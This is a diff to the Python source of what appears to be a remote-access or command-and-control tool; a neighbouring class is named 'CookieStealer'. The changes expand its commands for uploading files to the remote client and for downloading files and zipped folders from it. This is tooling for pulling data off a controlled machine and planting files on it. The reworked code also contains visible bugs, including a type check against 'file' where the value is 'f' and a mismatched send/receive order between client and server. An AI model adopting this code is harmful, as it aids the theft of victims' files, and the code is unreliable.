@@ -908,173 +908,284 @@ class CookieStealer(DoubleCommand):
 
 
 @add_double_command(
-    "upload_file",
-    "upload_file [ local path ] [ client side path ]",
-    "Uploads a file to the client",
+    "upload",
+    "upload [ local path ] [ client side path ]",
+    "Uploads a file or folder to the client",
     [ArgumentType.string, ArgumentType.string],
     EmptyReturn,
 )
-class UploadFile(DoubleCommand):
+class UploadItem(DoubleCommand):
+    @staticmethod
+    def compress_folder(path: str) -> bytes:
+        import zipfile
+        import io
+        import os
+
+        folder_path = os.path.abspath(path)
+        zio = io.BytesIO()
+
+        with zipfile.ZipFile(zio, "w") as zip_file:
+            for foldername, subfolders, filenames in os.walk(folder_path):
+                for filename in filenames:
+                    file_path = os.path.join(foldername, filename)
+
+                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))
+
+        zio.seek(0)
+        return zio.read()
+
     @staticmethod
     def client_side(sock: socket.socket) -> None:
+        import zipfile
+        import io
+
         try:
-            destination = sock.recv(int.from_bytes(sock.recv(8)))
+            item_type = sock.recv(1)
+            if item_type == b"E":
+                return
+            destination = sock.recv(int.from_bytes(sock.recv(4))).decode(
+                errors="ignore"
+            )
             file_contents = sock.recv(int.from_bytes(sock.recv(8)))
         except OSError:
             return
 
-        response = b"y"
-        try:
-            with open(destination, "wb") as dest_file:
-                dest_file.write(file_contents)
-        except PermissionError:
-            response = b"p"
-        except OSError:
-            response = b"?"
+        success_indicator = b"y"
+        if item_type == b"f":
+            try:
+                with open(destination, "wb") as out_file:
+                    out_file.write(file_contents)
+            except PermissionError:
+                success_indicator = b"p"
+                return
+            except FileNotFoundError:
+                success_indicator = b"f"
+                return
+            except OSError:
+                success_indicator = b"?"
+                return
+        elif item_type == b"d":
+            try:
+                with zipfile.ZipFile(io.BytesIO(file_contents), "r") as zip_file:
+                    zip_file.extractall(destination)
+            except OSError:
+                success_indicator = b"?"
+            except zipfile.BadZipFile:
+                success_indicator = b"z"
+        else:
+            success_indicator = b"i"
 
         try:
-            sock.sendall(response)
+            sock.sendall(success_indicator)
         except OSError:
             return
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
-        import os
+        import os.path
 
-        if not os.path.isfile(params[0]):
-            print(f"File '{params[0]} not found")
+        if not os.path.exists(params[0]):
+            print(f"Path '{params[0]} not found")
+            try:
+                client.socket.sendall(b"E")
+            except OSError:
+                pass
             return CommandResult(DoubleCommandResult.param_error)
 
-        with open(params[0], "rb") as file_to_send:
-            try:
-                file_contents = file_to_send.read()
-                client.socket.sendall(len(params[1]).to_bytes(8))
-                client.socket.sendall(params[1].encode())
-                client.socket.sendall(len(file_contents).to_bytes(8))
-                client.socket.sendall(file_contents)
-            except OSError:
-                print("Connection error whilst trying to send file")
-                return CommandResult(DoubleCommandResult.conn_error)
+        item_type = "file" if os.path.isfile(params[0]) else "folder"
+
+        if item_type == "file":
+            with open(params[0], "rb") as in_file:
+                item_contents = in_file.read()
+        else:
+            item_contents = UploadItem.compress_folder(params[0])  # type: ignore
 
         try:
-            success_indicator = client.socket.recv(1).decode(errors="ignore")
+            if item_type == "file":
+                client.socket.sendall(b"f")
+            else:
+                client.socket.sendall(b"d")
         except OSError:
-            print("Sent file but client did not respond with a success indicator")
+            print("Failed to send item type to client")
+            return CommandResult(DoubleCommandResult.conn_error)
+
+        try:
+            bytes_path = params[1].encode()
+            client.socket.sendall(len(bytes_path).to_bytes(2))
+            client.socket.sendall(bytes_path)
+            client.socket.sendall(len(item_contents).to_bytes(8))
+            client.socket.sendall(item_contents)
+        except OSError:
+            print(f"Failed to send {item_type} to client")
+            return CommandResult(DoubleCommandResult.conn_error)
+
+        try:
+            success_indicator = client.socket.recv(1)
+        except OSError:
+            print(f"Sent {item_type} but client did respond with a success indicator")
             return CommandResult(DoubleCommandResult.semi_success)
 
         match success_indicator:
-            case "y":
-                print("Sent file successfully")
+            case b"y":
+                print(f"Sent {item_type} successfully")
                 return CommandResult(DoubleCommandResult.success)
-            case "p":
+            case b"p":
                 print(
-                    f"Client does not have permission to write the given file {params[1]}"
+                    f"Client does not have permission to write the given {item_type} '{params[1]}'"
                 )
                 return CommandResult(DoubleCommandResult.failure)
-            case "?":
+            case b"?":
                 print(
-                    f"Client says that the given destination file path ({params[1]}) is invalid"
+                    f"There was a miscellaneous error on the client whilst writing the {item_type}"
                 )
+                return CommandResult(DoubleCommandResult.failure)
+            case b"f":
+                print(
+                    f"The parent directory of '{params[1]}' doesn't exist on the client"
+                )
+                return CommandResult(DoubleCommandResult.failure)
+            case b"i":
+                print("Client did not understand item type sent by server")
                 return CommandResult(DoubleCommandResult.failure)
             case _:
                 print(
-                    "Sent file but client did not respond with an invalid success indicator"
+                    f"Sent {item_type} but client responded with an invalid success indicator"
                 )
                 return CommandResult(DoubleCommandResult.semi_success)
 
 
 @add_double_command(
-    "download_file",
-    "download_file [ client side path ] [ local path ]",
-    "Downloads a file from the client",
+    "download",
+    "download [ client side path ] [ local path ]",
+    "Downloads a file or folder from the client",
     [ArgumentType.string, ArgumentType.string],
     EmptyReturn,
 )
-class DownloadFile(DoubleCommand):
+class DownloadItem(DoubleCommand):
+    @staticmethod
+    def compress_folder(path: str) -> bytes:
+        import zipfile
+        import io
+        import os
+
+        folder_path = os.path.abspath(path)
+        zio = io.BytesIO()
+
+        with zipfile.ZipFile(zio, "w") as zip_file:
+            for foldername, subfolders, filenames in os.walk(folder_path):
+                for filename in filenames:
+                    file_path = os.path.join(foldername, filename)
+
+                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))
+
+        zio.seek(0)
+        return zio.read()
+
     @staticmethod
     def client_side(sock: socket.socket) -> None:
+        import os.path
+
         try:
-            source = sock.recv(int.from_bytes(sock.recv(8)))
+            source_path = sock.recv(int.from_bytes(sock.recv(2)))
         except OSError:
             return
 
-        response = b"y"
+        if not os.path.exists(source_path):
+            try:
+                sock.sendall(b"n")
+            except OSError:
+                pass
+            return
+
+        item_type = "f" if os.path.isfile(source_path) else "d"
+
         try:
-            with open(source, "rb") as src_file:
-                file_contents = src_file.read()
+            if item_type == "file":
+                sock.sendall(b"f")
+            else:
+                sock.sendall(b"d")
+        except OSError:
+            return
+
+        success_indicator = b"y"
+        try:
+            if item_type == "f":
+                with open(source_path, "rb") as in_file:
+                    item_contents = in_file.read()
+            else:
+                item_contents = DownloadItem.compress_folder(source_path)  # type: ignore
         except PermissionError:
-            response = b"p"
-        except FileNotFoundError:
-            response = b"n"
-        except OSError:
-            response = b"?"
-
-        try:
-            sock.sendall(response)
-        except OSError:
-            pass
-
-        if response != b"y":
+            success_indicator = b"p"
             return
+        except OSError:
+            success_indicator = b"o"
+            return
+        except Exception:
+            success_indicator = b"e"
+            return
+
         try:
-            sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
-            sock.sendall(file_contents)  # type: ignore
+            sock.sendall(success_indicator)
+        except OSError:
+            return
+
+        if success_indicator != b"y":
+            return
+
+        try:
+            sock.sendall(len(item_contents).to_bytes(8))
+            sock.sendall(item_contents)
         except OSError:
             return
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
+        import zipfile
+        import io
+
         try:
-            client.socket.sendall(len(params[0]).to_bytes(8))
-            client.socket.sendall(params[0].encode())
+            bytes_path = params[0].encode()
+            client.socket.sendall(len(bytes_path).to_bytes(2))
+            client.socket.sendall(bytes_path)
         except OSError:
-            print("Connection error whilst trying to send source file path")
+            print("Failed to send path to client")
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            success_indicator = client.socket.recv(1).decode(errors="ignore")
+            item_type = client.socket.recv(1)
+            if item_type == b"n":
+                print("Item not found on client")
+                return CommandResult(DoubleCommandResult.failure)
+            file_contents = client.socket.recv(int.from_bytes(client.socket.recv(8)))
         except OSError:
-            print("Asked for file but client did not respond with a success indicator")
-            return CommandResult(DoubleCommandResult.semi_success)
+            print("Failed to recieve item from client")
+            return CommandResult(DoubleCommandResult.conn_error)
 
-        match success_indicator:
-            case "y":
-                try:
-                    file_contents = client.socket.recv(
-                        int.from_bytes(client.socket.recv(8))
-                    )
-                except OSError:
-                    print("Connection error whilst trying to recieve file contents")
-                    return CommandResult(DoubleCommandResult.conn_error)
-                except MemoryError:
-                    print("Client sent invalid information")
-                    return CommandResult(DoubleCommandResult.failure)
-                try:
-                    with open(params[1], "wb") as dest_file:
-                        dest_file.write(file_contents)
-                except OSError:
-                    print(f"Failure when writing to '{params[1]}")
-                    return CommandResult(DoubleCommandResult.failure)
-                print("Recieved and wrote file successfully")
-                return CommandResult(DoubleCommandResult.success)
-            case "p":
+        success_indicator = b"y"
+        if item_type == b"f":
+            try:
+                with open(params[1], "wb") as out_file:
+                    out_file.write(file_contents)
+            except OSError as err:
                 print(
-                    f"Client does not have permission to read the given file ('{params[0]}')"
+                    f"There was an operating system  error when writing the file (error code: {err.errno})"
                 )
                 return CommandResult(DoubleCommandResult.failure)
-            case "?":
+        else:
+            try:
+                with zipfile.ZipFile(io.BytesIO(file_contents), "r") as zip_file:
+                    zip_file.extractall(params[1])
+            except OSError as err:
                 print(
-                    f"Client says that the given source file path ('{params[0]}') is invalid"
+                    f"There was an operating system error whilst unzipping the folder (error code: {err.errno})"
                 )
                 return CommandResult(DoubleCommandResult.failure)
-            case "n":
-                print(f"Client says that the given file ('{params[0]}') doesn't exist")
+            except zipfile.BadZipFile:
+                print(f"Invalid ZIP file sent from client")
                 return CommandResult(DoubleCommandResult.failure)
-            case _:
-                print(
-                    "Recieved and wrote file but client did not respond with an invalid success indicator"
-                )
-                return CommandResult(DoubleCommandResult.failure)
+
+        print(f"Recieved {'file' if item_type == 'f' else 'folder'} successfully")
+        return CommandResult(DoubleCommandResult.success)
 
 
 @add_double_command(
